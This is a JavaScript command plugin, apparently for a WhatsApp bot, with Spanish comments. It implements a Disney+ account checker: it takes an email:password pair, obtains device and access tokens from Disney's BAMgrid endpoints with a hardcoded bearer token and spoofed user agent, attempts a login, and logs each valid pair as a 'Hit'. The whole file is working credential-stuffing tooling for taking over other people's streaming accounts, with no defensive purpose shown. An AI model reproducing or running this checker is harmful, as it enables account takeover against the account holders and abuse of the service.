import axios from 'axios';

let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  // Comando .Disney mail:pass
  if (command === 'disney') {
    const [email, password] = text.split(':');

    if (!email || !password) {
      return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.Disney email:password`', m);
    }

    try {
      // Configurar sesión y headers
      const session = axios.create();
      const headers = {
        'content-type': 'application/json',
        'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      };

      // Hacer la primera petición para obtener el assertion
      const deviceData = JSON.stringify({ deviceFamily: "browser", applicationRuntime: "chrome", deviceProfile: "windows", attributes: {} });
      const deviceResponse = await session.post('https://global.edge.bamgrid.com/devices', { headers, data: deviceData });
      
      if (!deviceResponse.data || !deviceResponse.data.assertion) {
        return conn.reply(m.chat, `Fallo al obtener assertion para ${email}`, m);
      }

      const assertion = deviceResponse.data.assertion;

      // Hacer la segunda petición para obtener el token de acceso
      const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;
      const tokenResponse = await session.post('https://global.edge.bamgrid.com/token', { headers: { ...headers, 'content-type': 'application/x-www-form-urlencoded' }, data: tokenData });

      if (!tokenResponse.data || !tokenResponse.data.access_token) {
        return conn.reply(m.chat, `Fallo al obtener el access token para ${email}`, m);
      }

      const accessToken = tokenResponse.data.access_token;

      // Realizar login con las credenciales del usuario
      const loginHeaders = { ...headers, 'authorization': `Bearer ${accessToken}` };
      const loginData = JSON.stringify({ email, password });
      const loginResponse = await session.post('https://global.edge.bamgrid.com/idp/login', { headers: loginHeaders, data: loginData });

      // Verificar si la respuesta contiene el id_token o algún otro indicador de éxito
      if (loginResponse.data && loginResponse.data.id_token) {
        const successMessage = `Hit -> ${email}:${password} | By: @hjofc123`;
        console.log("\x1b[32m" + successMessage + "\x1b[0m");
        conn.reply(m.chat, `Hit para ${email}`, m); // Solo mensaje de "Hit"
      } else {
        console.log("\x1b[31mBAD Account >>", email, "\x1b[0m");
        conn.reply(m.chat, `Bad Account para ${email}`, m); // Solo mensaje de "Bad"
      }
    } catch (error) {
      console.error('Error:', error);
      // Manejo de errores
      if (error.response) {
        conn.reply(m.chat, `Error en la respuesta del servidor para ${email}. Intenta nuevamente más tarde.`, m);
      } else {
        conn.reply(m.chat, `Error desconocido al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
      }
    }
  }
};

// Establecer el comando
handler.command = ['disney'];

export default handler;
